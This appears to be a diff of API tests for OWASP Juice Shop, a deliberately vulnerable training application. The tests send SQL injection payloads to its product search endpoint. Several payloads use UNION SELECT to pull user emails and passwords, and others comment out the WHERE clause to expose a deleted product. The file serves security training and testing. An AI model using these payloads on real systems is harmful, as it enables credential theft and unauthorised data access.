@@ -165,7 +165,7 @@ frisby.create('GET product search fails with error message that exposes ins SQL 
     .expectBodyContains('SQLITE_ERROR: near &quot;;&quot;: syntax error')
     .toss();
 
-frisby.create('GET product search SQL Injection fails from missing closing parenthesis')
+frisby.create('GET product search SQL Injection fails from two missing closing parenthesis')
     .get(REST_URL + '/product/search?q=\' union select null,id,email,password,null,null,null from users--')
     .expectStatus(500)
     .expectHeaderContains('content-type', 'text/html')
@@ -173,8 +173,16 @@ frisby.create('GET product search SQL Injection fails from missing closing paren
     .expectBodyContains('SQLITE_ERROR: near &quot;union&quot;: syntax error')
     .toss();
 
+frisby.create('GET product search SQL Injection fails from one missing closing parenthesis')
+    .get(REST_URL + '/product/search?q=\') union select null,id,email,password,null,null,null from users--')
+    .expectStatus(500)
+    .expectHeaderContains('content-type', 'text/html')
+    .expectBodyContains('<h1>Juice Shop (Express ~')
+    .expectBodyContains('SQLITE_ERROR: near &quot;union&quot;: syntax error')
+    .toss();
+
 frisby.create('GET product search SQL Injection fails for SELECT * FROM attack due to wrong number of returned columns')
-    .get(REST_URL + '/product/search?q=\') union select * from users--')
+    .get(REST_URL + '/product/search?q=\')) union select * from users--')
     .expectStatus(500)
     .expectHeaderContains('content-type', 'text/html')
     .expectBodyContains('<h1>Juice Shop (Express ~')
@@ -182,7 +190,7 @@ frisby.create('GET product search SQL Injection fails for SELECT * FROM attack d
     .toss();
 
 frisby.create('GET product search can create UNION SELECT with Users table and fixed columns')
-    .get(REST_URL + '/product/search?q=\') union select \'1\',\'2\',\'3\',\'4\',\'5\',\'6\',\'7\' from users--')
+    .get(REST_URL + '/product/search?q=\')) union select \'1\',\'2\',\'3\',\'4\',\'5\',\'6\',\'7\',\'8\' from users--')
     .expectStatus(200)
     .expectHeaderContains('content-type', 'application/json')
     .expectJSON('data.?', {
@@ -196,7 +204,7 @@ frisby.create('GET product search can create UNION SELECT with Users table and f
     }).toss();
 
 frisby.create('GET product search can create UNION SELECT with Users table and required columns')
-    .get(REST_URL + '/product/search?q=\') union select null,id,email,password,null,null,null from users--')
+    .get(REST_URL + '/product/search?q=\')) union select null,id,email,password,null,null,null,null from users--')
     .expectStatus(200)
     .expectHeaderContains('content-type', 'application/json')
     .expectJSON('data.?', {
@@ -215,3 +223,27 @@ frisby.create('GET product search can create UNION SELECT with Users table and r
         price: insecurity.hash('booze')
     })
     .toss();
+
+frisby.create('GET product search cannot select logically deleted christmas special by default')
+    .get(REST_URL + '/product/search?q=christmas')
+    .expectStatus(200)
+    .expectHeaderContains('content-type', 'application/json')
+    .expectJSON('data', [])
+    .toss();
+
+frisby.create('GET product search cannot select logically deleted christmas special by forced early where-clause termination')
+    .get(REST_URL + '/product/search?q=christmas\'))--')
+    .expectStatus(200)
+    .expectHeaderContains('content-type', 'application/json')
+    .expectJSON('data', [])
+    .toss();
+
+frisby.create('GET product search can select logically deleted christmas special by forcibly commenting out the remainder of where clause')
+    .get(REST_URL + '/product/search?q=\'))--')
+    .expectStatus(200)
+    .expectHeaderContains('content-type', 'application/json')
+    .expectJSON('data.?', {
+        name: 'Christmas Super-Surprise-Box (2014 Edition)'
+    })
+    .toss();
+
